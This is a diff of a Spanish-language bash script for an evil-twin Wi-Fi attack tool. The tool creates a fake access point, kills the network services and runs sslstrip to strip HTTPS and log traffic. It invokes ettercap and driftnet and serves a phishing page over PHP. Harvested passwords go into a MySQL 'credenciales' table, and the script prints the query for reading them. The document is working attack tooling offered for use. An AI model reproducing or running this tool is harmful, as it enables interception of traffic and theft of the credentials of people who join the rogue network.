@@ -30,7 +30,10 @@ function ctrl_c(){
     sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-    tput cnorm; service network-manager restart
+    tput cnorm; service networking restart
+
+    echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
+    echo -e "${redColour}By Daniel Reyero${endColour}"
     exit 0
 }
 
@@ -120,16 +123,16 @@ sleep  1
     echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Ingrese el nombre que le gustaría que se llamara su AP Wifi Falso, o presione enter para usar Fake_AP:${endColour} " && read -r use_ssid
     if [ "$use_ssid" = "" ];then
         use_ssid="Fake_AP"
-        echo -e "\n${blueColour}$use_ssid Selecciono el nombre Fake_AP por defecto.${endColour}\n"
+        echo -e "\n${blueColour}Selecciono el nombre $use_ssid por defecto.${endColour}\n"
     fi
     echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
     if [ "$use_channel" = "" ];then
         use_channel="10"
-        echo -e "\n${blueColour}$use_ssid Selecciono el canal 10 por defecto.${endColour}\n"
+        echo -e "\n${blueColour}Selecciono el canal 10 por defecto.${endColour}"
     fi
     echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
     sleep 2
-    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+    killall network-manager networking hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
     sleep 5
 
     echo -e "interface=$choosed_interface\n" > hostapd.conf
@@ -205,7 +208,7 @@ mkdir -p $HOME/Wifi
 echo
 echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}\n" 
 
-sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log & sslstripid=$!
+sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log sslstripid=$! > /dev/null 2>&1 &
 sleep 2
 
 # Ettercap
@@ -273,18 +276,22 @@ fi
     sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-    tput cnorm; service network-manager restart
+    tput cnorm; service networking restart
+    
+echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
+echo -e "${redColour}By Daniel Reyero${endColour}"
 
-kill ${sslstripid} &> /dev/null
-kill ${ettercapid} &> /dev/null
-kill ${dritnetid} &> /dev/null
+kill ${sslstripid} > /dev/null 2>&1
+kill ${ettercapid} > /dev/null 2>&1
+kill ${dritnetid} > /dev/null 2>&1
 
+exit
 fi
 # SEGUNDA PARTE de pagina web
 
 if [ "$AIRBASE" = "0" ]; then
 
-        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} Web_BBDD${endColour}\n"; sleep 1
         pushd Web_BBDD > /dev/null 2>&1
         php -S 192.168.1.1:80 > /dev/null 2>&1 &
         sleep 2
@@ -306,7 +313,7 @@ if [ "$AIRBASE" = "0" ]; then
 sleep 2
 #ejecuta el script de la base de datos
 source utilities/bbdd.sh 
-echo "Página web creada con éxito en http://10.0.0.1/"
+echo "Página web y base de datos creadas con éxito"
 
 sleep 2
 
@@ -317,7 +324,7 @@ echo
 echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos $DB_NAME
    ${purpleColour} 1.- mysql
     2.- USE $DB_NAME;
-    3.- SELECT * FROM usuario;${endColour}"
+    3.- SELECT * FROM credenciales;${endColour}"
 echo
 echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"
 
@@ -329,7 +336,7 @@ read junk
     sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-    tput cnorm; service network-manager restart
+    tput cnorm; service networking restart
 fi
 
 
@@ -376,9 +383,6 @@ if [ "$AIRBASE" = "2" ]; then
 
 fi
 
-echo "
-
-    Gracias por usar esta herramienta, Buena Suerte..."
-echo $RED
-echo By Daniel Reyero
-exit
+echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
+echo -e "${redColour}By Daniel Reyero${endColour}"
+exit 0
